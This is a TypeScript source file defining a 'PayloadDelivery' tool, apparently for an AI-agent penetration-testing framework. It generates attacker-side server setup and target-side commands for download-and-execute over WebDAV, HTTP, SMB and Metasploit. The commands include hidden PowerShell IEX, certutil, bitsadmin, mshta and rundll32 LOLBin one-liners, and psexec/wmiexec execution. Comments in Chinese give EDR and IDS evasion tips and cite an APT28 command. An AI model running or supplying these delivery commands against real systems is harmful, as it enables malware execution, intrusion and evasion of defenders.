/**
 * PayloadDeliveryTool — automated payload delivery for authorized security assessments.
 *
 * Supports: UNC WebDAV, HTTP server, C2 deploy, SMB share.
 * Generates execution commands for the target side.
 */

import { exec as execCb } from 'child_process'
import { promisify } from 'util'
import { randomBytes } from 'crypto'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

const exec = promisify(execCb)

interface PayloadDeliveryInput {
  payload_path: string
  delivery_method: 'unc_webdav' | 'http_server' | 'c2_deploy' | 'smb_share'
  target_host?: string
  target_path?: string
  share_name?: string
  lhost?: string
  lport?: number
}

export class PayloadDeliveryTool implements Tool {
  name = 'PayloadDelivery'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'PayloadDelivery',
      description: `Automated payload delivery for authorized security assessments.

## Methods
- unc_webdav: Start WebDAV share, generate rundll32 UNC execution command
- http_server: Start HTTP server, generate certutil/wget download command
- c2_deploy: Deploy via C2 framework (requires C2Tool)
- smb_share: Configure SMB share for payload access

## Parameters
- payload_path: path to payload binary/script
- delivery_method: delivery method
- target_host: target IP/hostname
- target_path: target download path
- share_name: SMB/WebDAV share name
- lhost: attacker IP (for HTTP server binding)
- lport: attacker port (for HTTP server)`,
      parameters: {
        type: 'object',
        properties: {
          payload_path: { type: 'string', description: 'Path to payload file' },
          delivery_method: { type: 'string', enum: ['unc_webdav', 'http_server', 'c2_deploy', 'smb_share'], description: 'Delivery method' },
          target_host: { type: 'string', description: 'Target IP/hostname' },
          target_path: { type: 'string', description: 'Target download path' },
          share_name: { type: 'string', description: 'Share name for SMB/WebDAV' },
          lhost: { type: 'string', description: 'Attacker IP' },
          lport: { type: 'number', description: 'HTTP server port' },
        },
        required: ['payload_path', 'delivery_method'],
      },
    },
  }

  async execute(input: Record<string, unknown>, _context: ToolContext): Promise<ToolResult> {
    const {
      payload_path,
      delivery_method,
      target_host = 'TARGET_IP',
      target_path,
      share_name = 'payloads',
      lhost,
      lport = 8080,
    } = input as unknown as PayloadDeliveryInput

    const lines: string[] = ['[PayloadDelivery] 投递', '═'.repeat(60)]
    lines.push(`  方法: ${delivery_method}`)
    lines.push(`  Payload: ${payload_path}`)
    lines.push('')

    switch (delivery_method) {
      case 'unc_webdav':
        return this.uncWebDAV(payload_path, target_host, share_name)
      case 'http_server':
        return this.httpServer(payload_path, target_host, lhost || '0.0.0.0', lport, target_path)
      case 'c2_deploy':
        return this.c2Deploy(payload_path, target_host)
      case 'smb_share':
        return this.smbShare(payload_path, target_host, share_name)
      default:
        return { content: `[PayloadDelivery] Unknown method: ${delivery_method}`, isError: true }
    }
  }

  // ── UNC WebDAV delivery ──
  private async uncWebDAV(payloadPath: string, targetHost: string, shareName: string): Promise<ToolResult> {
    const lines: string[] = ['[PayloadDelivery] UNC WebDAV 投递', '═'.repeat(60)]

    lines.push('')
    lines.push('── 攻击机侧操作 ──')
    lines.push('1. 启动 Python WebDAV 服务器:')
    lines.push('   pip install wsgidav cheroot')
    lines.push('   python3 -m wsgidav --host=0.0.0.0 --port=80 --root=/tmp/webdav --auth=anonymous')
    lines.push('')
    lines.push('2. 将 payload 放到 WebDAV 根目录:')
    lines.push(`   cp ${payloadPath} /tmp/webdav/${shareName}/`)
    lines.push('')

    lines.push('── 目标侧执行 ──')

    // DLL delivery via rundll32
    lines.push('# 方法 1: rundll32 直接内存加载 (DLL)')
    lines.push(`   rundll32.exe \\\\${targetHost}\\${shareName}\\payload.dll,EntryPoint`)
    lines.push('')

    // EXE delivery via mshta
    lines.push('# 方法 2: mshta + UNC (EXE)')
    lines.push(`   mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""\\\\${targetHost}\\${shareName}\\payload.exe"", 0:close")`)
    lines.push('')

    // PowerShell UNC
    lines.push('# 方法 3: PowerShell UNC 下载执行')
    lines.push(`   powershell -nop -w hidden -c "IEX([System.IO.File]::ReadAllText('\\\\\\\\${targetHost}\\\\${shareName}\\\\payload.ps1'))"`)
    lines.push('')

    lines.push('── 技术原理 ──')
    lines.push('- UNC 路径触发 Windows WebClient 服务自动连接 WebDAV')
    lines.push('- DLL 直接从网络加载到内存，无本地文件落地')
    lines.push('- rundll32.exe 是系统合法程序（LOLBin），不会被大多数 EDR 标记')
    lines.push('- mshta.exe 同样是被信任的 LOLBin')
    lines.push('')
    lines.push('── APT28 参考 ──')
    lines.push('APT28 使用: C:\\Windows\\System32\\rundll32.exe \\\\104.168.x.x\\webdav\\SimpleLoader.dll,EntryPoint')

    return { content: lines.join('\n'), isError: false }
  }

  // ── HTTP server delivery ──
  private async httpServer(payloadPath: string, targetHost: string, lhost: string, lport: number, targetPath?: string): Promise<ToolResult> {
    const lines: string[] = ['[PayloadDelivery] HTTP Server 投递', '═'.repeat(60)]

    const fileName = payloadPath.split(/[\\/]/).pop() || 'payload.exe'
    const downloadPath = targetPath || `C:\\Users\\Public\\${fileName}`

    lines.push('')
    lines.push('── 攻击机侧操作 ──')
    lines.push('1. 启动 HTTP 服务器:')
    lines.push(`   python3 -m http.server ${lport} -d $(dirname ${payloadPath})`)
    lines.push('')
    lines.push('2. 或使用更隐蔽的服务器:')
    lines.push(`   python3 -c "import http.server; http.server.test(HandlerClass=http.server.SimpleHTTPRequestHandler, ServerClass=http.server.HTTPServer, port=${lport})"`)
    lines.push('')

    lines.push('── 目标侧执行 ──')

    // certutil (Windows built-in)
    lines.push('# 方法 1: certutil (Windows 内置，无需额外工具)')
    lines.push(`   certutil -urlcache -split -f http://${lhost}:${lport}/${fileName} "${downloadPath}"`)
    lines.push(`   && start "${downloadPath}"`)
    lines.push('')

    // PowerShell download
    lines.push('# 方法 2: PowerShell 下载执行')
    lines.push(`   powershell -nop -w hidden -c "Invoke-WebRequest -Uri 'http://${lhost}:${lport}/${fileName}' -OutFile '${downloadPath}'; Start-Process '${downloadPath}'"`)
    lines.push('')

    // Bitsadmin
    lines.push('# 方法 3: bitsadmin (Windows BITS — 隐蔽传输)')
    lines.push(`   bitsadmin /transfer job1 http://${lhost}:${lport}/${fileName} "${downloadPath}"`)
    lines.push(`   && start "${downloadPath}"`)
    lines.push('')

    // wget (if available on target)
    lines.push('# 方法 4: wget (如果目标有)')
    lines.push(`   wget http://${lhost}:${lport}/${fileName} -O "${downloadPath}" && "${downloadPath}"`)
    lines.push('')

    lines.push('── 免杀建议 ──')
    lines.push('- certutil 下载的文件名建议伪装为合法文件名')
    lines.push('- 使用 HTTPS 服务器 (stunnel/caddy) 避免网络 IDS 检测')
    lines.push('- 可配置自定义 User-Agent 和 Referer 头')

    return { content: lines.join('\n'), isError: false }
  }

  // ── C2 deploy ──
  private async c2Deploy(payloadPath: string, targetHost: string): Promise<ToolResult> {
    const lines: string[] = ['[PayloadDelivery] C2 Deploy 投递', '═'.repeat(60)]

    lines.push('')
    lines.push('── C2 框架操作 ──')
    lines.push('调用 C2Tool 进行部署:')
    lines.push('')
    lines.push('# Metasploit:')
    lines.push('  use exploit/multi/handler')
    lines.push('  set PAYLOAD windows/x64/meterpreter/reverse_tcp')
    lines.push(`  set LHOST ${targetHost}`)
    lines.push('  set LPORT 4444')
    lines.push('  run -j')
    lines.push('')
    lines.push('  # 上传 payload')
    lines.push(`  upload ${payloadPath} C:\\\\Users\\\\Public\\\\`)
    lines.push('')
    lines.push('# Sliver:')
    lines.push('  generate --os windows --arch amd64 --format BINARY')
    lines.push(`  # 输出: ${payloadPath}`)
    lines.push('')

    lines.push('── 技术原理 ──')
    lines.push('- C2 框架自带加密传输，payload 直接注入内存')
    lines.push('- 不需要落地文件（如果配置 in-memory 执行）')
    lines.push('- 使用 C2Tool 工具进行实际操作')

    return { content: lines.join('\n'), isError: false }
  }

  // ── SMB share delivery ──
  private async smbShare(payloadPath: string, targetHost: string, shareName: string): Promise<ToolResult> {
    const lines: string[] = ['[PayloadDelivery] SMB Share 投递', '═'.repeat(60)]

    lines.push('')
    lines.push('── 攻击机侧操作 ──')
    lines.push('1. 配置 Samba 共享 (Linux):')
    lines.push('   # /etc/samba/smb.conf')
    lines.push('   [payloads]')
    lines.push('   path = /tmp/smb_share')
    lines.push('   browseable = yes')
    lines.push('   read only = yes')
    lines.push('   guest ok = yes')
    lines.push('')
    lines.push('2. 重启 Samba:')
    lines.push('   systemctl restart smbd')
    lines.push('')
    lines.push('3. 放置 payload:')
    lines.push(`   cp ${payloadPath} /tmp/smb_share/`)
    lines.push('')

    lines.push('── 目标侧执行 ──')
    lines.push('# 方法 1: 直接 UNC 执行')
    lines.push(`   \\\\${targetHost}\\${shareName}\\payload.exe`)
    lines.push('')
    lines.push('# 方法 2: psexec (需要凭据)')
    lines.push(`   psexec.py DOMAIN/user:pass@${targetHost} \\\\${targetHost}\\${shareName}\\payload.exe`)
    lines.push('')
    lines.push('# 方法 3: wmiexec (需要凭据)')
    lines.push(`   wmiexec.py DOMAIN/user:pass@${targetHost} "\\\\${targetHost}\\${shareName}\\payload.exe"`)
    lines.push('')

    lines.push('── Impacket 工具 ──')
    lines.push('# smbserver (快速 SMB 共享)')
    lines.push('   impacket-smbserver shareName /tmp/smb_share')
    lines.push('')

    lines.push('── 注意事项 ──')
    lines.push('- SMB 传输可能被 EDR 的 AMSI 或网络监控检测')
    lines.push('- 确保 SMB 端口 (445/TCP) 在目标网络可达')
    lines.push('- 使用 impacket-smbserver 比 Samba 更快速简便')

    return { content: lines.join('\n'), isError: false }
  }
}
